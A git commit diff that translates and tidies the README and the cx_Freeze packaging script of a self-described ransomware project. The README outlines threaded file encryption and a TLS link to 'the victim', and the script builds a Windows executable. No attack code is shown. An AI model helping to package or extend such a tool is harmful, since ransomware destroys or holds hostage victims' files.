9af0f7162c4bcf402bf1408a6860716ea46e132a
RomainLanglois <romain.langlois@viacesi.fr>
2017-12-08 14:09:17 +0100

    Correcting and finishing translation

--- Code Ransonware/README.md
+++ Code Ransonware/README.md
@@ -1,7 +1,6 @@
 # About
 
-This code is the version 2.1 of the ransomware
-To use it, you will need :
+This code is the version 2.1 of the ransomware. To use it, you will need :
 
 * Python version 3
 * A machine acting as a server
@@ -19,11 +18,11 @@ This code will be improve to add new features like :
 
 # Notes 
 
-* This ransomware uses a multi-threading system to improve the encrypt process
-* The connection between the client and the victim is encrypt with a TLS socket
+* This ransomware uses a multi-threading system to improve the encrypting process
+* The connection between the client and the victim is encrypted with a TLS socket
 * The encrypt files are lost if the key is not the right one
 * To avoid some issues with the GUI (Tkinter module), you will need to add two DLL files at the root folder "tcl86t.dll" and "tk86t.dll". Their paths must be specify in the setup.py file.
-* An icon is necessary. You will need to add it in the new folder (created by setup.py) and named it "icon.ico"
+* An icon is necessary. You will need to add it in the new folder (created by setup.py) and name it "icon.ico"
 
 # Adding new features
 
--- Code Ransonware/Setup.py
+++ Code Ransonware/Setup.py
@@ -3,13 +3,12 @@ import sys, os
 from cx_Freeze import setup, Executable
 
 # Variables
-# Nécessaire pour l'interface graphique, à adapter au besoin !
+# Needed for the GUI, to adapt if necessary !
 os.environ['TCL_LIBRARY'] = r'C:\Program Files (x86)\Python36-32\tcl\tcl8.6'
 os.environ['TK_LIBRARY'] = r'C:\Program Files (x86)\Python36-32\tcl\tk8.6'
 
-# Les dépendances sont normalements détectées mais, il est préférable de les spécifier.
-# Les fichiers .dll sont nécéssaires pour le fonctionnement de l'interface graphique.
-# ils doivent se trouver dans le même répertoire que le fichier "Main.py".
+# The dependencies are normally detected but it's better to specify them
+# The .dll files are necessary for the GUI to work
 build_exe_options = {"packages": ["cffi",
                                   "cryptography",
                                   "idna",
@@ -23,18 +22,19 @@ build_exe_options = {"packages": ["cffi",
                      "include_files": ["tcl86t.dll", "tk86t.dll"]}
 
 
-# Les applications GUI nécéssitent une base différente sous Windows.
-# La base par défaut est faite pour les applications en console.
+
+# GUI applications require a different base on Windows.
+# The default base is for console applications.
 base = None
 if sys.platform == "win32":
     base = "Win32GUI"
 
 
-# Fonction de setup spécifiant certains paramètres.
+# Setup function, specifying some parameters
 setup(
-        name = "ransonware",
-        version = "0.1",
-        description = "un vilain ransonware",
+        name = "ransomware",
+        version = "2.1",
+        description = "a nasty ransomware",
         options = {"build_exe": build_exe_options},
         executables = [Executable("Main.py", base=base)]
     )
